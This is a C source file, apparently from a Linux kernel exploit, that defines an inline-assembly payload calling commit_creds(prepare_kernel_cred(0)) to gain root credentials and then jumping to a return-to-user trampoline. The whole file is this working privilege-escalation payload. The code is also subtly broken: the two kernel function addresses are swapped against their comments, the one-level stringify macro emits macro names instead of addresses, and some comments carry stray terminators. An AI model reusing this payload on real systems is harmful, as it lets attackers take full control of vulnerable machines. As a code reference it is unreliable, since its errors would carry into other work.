#include "privesc.h"
#include "utils.h"
#include <sys/types.h>

#define __stringify(x) #x

/* ============= 1 =============
 * Privesc from kernel creds:
 *      commit_creds(prepare_kernel_cred(0));
 *
 * We will need to use global variables in the assembly,
 *      rather than passing locals to register.
 *      Because the program will crash when certain regs are occupied
 *      Even though we specify clobbers (but we don't know all)
 * */
void privesc_kcred(void)
{
    __asm__ __volatile__ (
        ".intel_syntax noprefix;\n"
        // prepare_kernel_cred*/
        "movabs rax, " __stringify(COMMIT_CREDS_ADDR) ";"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        // commit_creds*/
        "movabs rax, " __stringify(PREPARE_KERNEL_CRED_ADDR) ";"
        "call rax;"
        "mov rax, " __stringify(PRIVESC_JUMP_ADDR) ";"
        // jmp to ret2user_trampoline or any return stub
        "jmp rax;"
        ".att_syntax;"
    );
}






